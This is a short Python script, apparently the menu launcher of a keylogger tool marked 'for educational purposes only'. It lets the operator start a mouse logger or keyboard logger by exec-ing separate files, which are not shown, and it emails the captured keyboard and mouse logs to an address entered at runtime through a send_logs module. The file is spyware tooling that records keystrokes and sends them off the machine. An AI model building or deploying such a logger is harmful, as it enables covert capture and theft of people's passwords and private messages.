import send_logs as sl

ori_logo = open("ori-logo.txt", "r")
ori_logo = ori_logo.read()
print(ori_logo)
print("© Copyright Sami Hindi 2022")
print("This product is licensed under the GNU General Public License")
print("For any questions or inquiries, please send me an E-Mail at 'fujiwarachoki@zohomail.eu'")
print("For Educational Purposes only")
print("\n\n")
print("------------------------------------------------------------------------------------------------------")
print("\n\n")
print("PRESS 'm' FOR MOUSE LOGGER")
print("PRESS 'k' FOR KEYBOARD LOGGER")
print("PRESS 's' TO SEND LOGS TO EMAIL")
print("PRESS ANY OTHER KEY TO EXIT PROGRAM")
choice = input()
print("\n\n")
print("------------------------------------------------------------------------------------------------------")

if choice == 'm':
    mouse_logger = open("mouse_logging.py")
    exec(mouse_logger.read())
elif choice == 'k':
    keyboard_logger = open("key_logging.py")
    exec(keyboard_logger.read())

elif choice == 's':
    print("\n\n")
    print("------------------------------------------------------------------------------------------------------")
    print("ENTER YOUR EMAIL")
    email = input()
    sl.send_email("Keyboard Logs", sl.logs1, email)
    sl.send_email("Mouse Logs", sl.logs2, email)
    print("Sent Logs to " + email)
else:
    print("\n\n")
    print("------------------------------------------------------------------------------------------------------")
    print("EXITED PROGRAM")
    exit()
